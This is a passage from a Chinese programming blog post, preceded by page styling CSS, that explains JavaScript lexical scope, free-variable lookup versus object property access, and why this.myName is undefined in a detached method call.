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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atelier-lakeside-light">.hljs-comment,.hljs-quote{color:#5a7b8c}.hljs-attribute,.hljs-link,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#d22d72}.hljs-built_in,.hljs-builtin-name,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#935c25}.hljs-bullet,.hljs-string,.hljs-symbol{color:#568c3b}.hljs-section,.hljs-title{color:#257fad}.hljs-keyword,.hljs-selector-tag{color:#6b6bb8}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#ebf8ff;color:#516d7b}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、自由变量 vs 对象属性：</h2>
<p>一段代码揭示 JavaScript 作用域的本质</p>
<p>我们从一段看似简单、却常被用作教学陷阱的 JavaScript 代码开始：</p>
<pre><code class="hljs language-Js" lang="Js"><span class="hljs-keyword">var</span> bar = { 
  <span class="hljs-attr">myName</span>: <span class="hljs-string">"time.geekbang.com"</span>,
  <span class="hljs-attr">printName</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myName); <span class="hljs-comment">// 注意：这里没有 this，也没有声明 myName</span>
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">let</span> myName = <span class="hljs-string">'极客时间'</span>;
  <span class="hljs-keyword">return</span> bar.<span class="hljs-property">printName</span>;
}

<span class="hljs-keyword">let</span> _printName = <span class="hljs-title function_">foo</span>();
<span class="hljs-title function_">_printName</span>(); <span class="hljs-comment">// ❌ ReferenceError: myName is not defined</span>
</code></pre>
<p>初看之下，这段代码似乎只是想“打印某个名字”。但运行后，控制台会抛出一个错误：</p>
<pre><code class="hljs language-txt" lang="txt">ReferenceError: myName is not defined
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/acd4ae07d1e8432bbdff06ec7982a690~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oSP5LmJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765446092&amp;x-signature=%2B%2FnSfVd4nELMAzRiDleHa9zbJEQ%3D" alt="image.png" loading="lazy"/></p>
<p><strong>为什么会这样？</strong><br/>
这背后涉及 JavaScript 中两个极易混淆的核心概念：<strong>词法作用域中的自由变量查找</strong> 与 <strong>对象属性访问</strong>。它们看似相似，实则天差地别。</p>
<hr/>
<h3 data-id="heading-1">🔍 <code>myName</code> 到底是谁？</h3>
<p>关键问题在于：<strong><code>printName</code> 函数体中的 <code>myName</code> 指的是什么？</strong></p>
<ul>
<li>它<strong>不是</strong> <code>this.myName</code> —— 代码中压根没写 <code>this</code>；</li>
<li>它也<strong>不是</strong>局部变量 —— 函数内部没有用 <code>var</code>、<code>let</code> 或 <code>const</code> 声明 <code>myName</code>。</li>
</ul>
<p>于是，JavaScript 引擎启动<strong>标识符解析（Identifier Resolution）</strong> 机制：沿着<strong>词法作用域链（Lexical Scope Chain）</strong> 向上查找这个变量。</p>
<blockquote>
<p>📌 <strong>词法作用域由函数“定义的位置”决定，而非“调用的位置”</strong> 。</p>
</blockquote>
<p>查找路径如下：</p>
<ol>
<li>在 <code>printName</code> 自身的作用域中查找 → <strong>未找到</strong>；</li>
<li>跳转到该函数<strong>定义时的外层作用域</strong> → 这里是<strong>全局作用域</strong>；</li>
<li>在全局作用域中查找名为 <code>myName</code> 的绑定。</li>
</ol>
<p>然而，在初始版本中，<strong>全局作用域确实没有 <code>myName</code> 变量</strong>。</p>
<blockquote>
<p>⚠️ 重要区分：<strong>对象属性 ≠ 变量</strong><br/>
尽管 <code>bar</code> 对象有一个 <code>myName</code> 属性，但 <code>bar.myName</code> 是<strong>属性访问表达式</strong>，而 <code>myName</code> 是一个<strong>自由变量（Free Variable）</strong> 。<br/>
JavaScript <strong>不会</strong>自动将对象属性当作同名变量来解析。</p>
</blockquote>
<p>因此，引擎找不到 <code>myName</code>，抛出 <code>ReferenceError</code>。</p>
<hr/>
<h3 data-id="heading-2">✅ 添加全局变量后：为什么输出 “极客邦”？</h3>
<p>现在我们在全局作用域添加一行：</p>
<pre><code class="hljs language-Js" lang="Js"><span class="hljs-keyword">let</span> myName = <span class="hljs-string">'极客邦'</span>;
</code></pre>
<p>完整代码变为：</p>
<pre><code class="hljs language-Html" lang="Html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">var</span> bar = { 
  <span class="hljs-attr">myName</span>: <span class="hljs-string">"time.geekbang.com"</span>,
  <span class="hljs-attr">printName</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myName); <span class="hljs-comment">// 自由变量查找</span>
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">let</span> myName = <span class="hljs-string">'极客时间'</span>;
  <span class="hljs-keyword">return</span> bar.<span class="hljs-property">printName</span>;
}

<span class="hljs-keyword">let</span> myName = <span class="hljs-string">'极客邦'</span>; <span class="hljs-comment">// ← 全局词法环境中的绑定</span>
<span class="hljs-keyword">let</span> _printName = <span class="hljs-title function_">foo</span>();
<span class="hljs-title function_">_printName</span>(); <span class="hljs-comment">// 输出：'极客邦'</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>此时，<code>printName</code> 执行时：</p>
<ul>
<li>自身作用域无 <code>myName</code>；</li>
<li>沿词法作用域链向上 → 找到<strong>全局作用域中的 <code>myName</code> 绑定</strong>；</li>
<li>成功解析为 <code>'极客邦'</code>。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2bc0edc3bf1b4da5be9e94808973be6b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oSP5LmJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765446092&amp;x-signature=6qrV2aA61ee22xCGUuV5Eoj%2BnC8%3D" alt="image.png" loading="lazy"/></p>
<blockquote>
<p>💡 补充说明：<br/>
虽然 <code>let</code> 声明的全局变量<strong>不会挂载到 <code>window</code> 对象上</strong>（即 <code>window.myName === undefined</code>），但它<strong>仍然存在于全局词法环境（Global Lexical Environment）中</strong>，对自由变量查找完全可见。<br/>
这正是 ES6 引入块级作用域后的设计：<strong>作用域查找 ≠ 全局对象属性查找</strong>。</p>
</blockquote>
<hr/>
<h3 data-id="heading-3">🎯 如何真正访问 <code>"time.geekbang.com"</code>？</h3>
<p>我们的目标其实是 <code>bar</code> 对象上的属性值 <code>"time.geekbang.com"</code>。既然 <code>console.log(myName)</code> 打印的是全局变量 <code>'极客邦'</code>，那该如何正确访问对象属性？</p>
<p>答案很简单：<strong>显式通过对象引用访问</strong>。</p>
<pre><code class="hljs language-Js" lang="Js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(bar.<span class="hljs-property">myName</span>); <span class="hljs-comment">// ✅ 输出 "time.geekbang.com"</span>
</code></pre>
<p>这行代码之所以成功，是因为它直接执行了<strong>属性访问操作</strong>。只要 <code>bar</code> 在当前作用域可见（这里是全局），就能稳定、可靠地获取其属性。</p>
<blockquote>
<p>🗣️ 虽说“直呼其名有点不礼貌”？<br/>
其实在编程中，<strong>清晰比委婉更重要</strong>。<br/>
显式写出 <code>bar.myName</code>，是对代码可读性和可维护性的最大尊重。</p>
</blockquote>
<hr/>
<h3 data-id="heading-4">⚠️ 那 <code>this.myName</code> 为什么不行？</h3>
<p>第三行代码试图用 <code>this</code> 来访问：</p>
<pre><code class="hljs language-Js" lang="Js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">myName</span>); <span class="hljs-comment">// ❌ 输出 undefined</span>
</code></pre>
<p>问题出在 <strong><code>this</code> 的绑定方式</strong> 上。</p>
<p>虽然 <code>printName</code> 是 <code>bar</code> 的方法，但我们是这样调用它的：</p>
<pre><code class="hljs language-Js" lang="Js"><span class="hljs-keyword">let</span> _printName = <span class="hljs-title function_">foo</span>();
<span class="hljs-title function_">_printName</span>(); <span class="hljs-comment">// 直接调用函数，没有通过 bar</span>
</code></pre>
<p>这种调用方式下，<code>this</code> 指向<strong>全局对象</strong>（如浏览器中的 <code>window</code>）。</p>
<p>但全局变量是用 <code>let</code> 声明的：</p>
<pre><code class="hljs language-Js" lang="Js"><span class="hljs-keyword">let</span> myName = <span class="hljs-string">'极客邦'</span>;
</code></pre>
<p>而 <code>let</code> 声明的变量<strong>不会成为全局对象的属性</strong>，所以：</p>
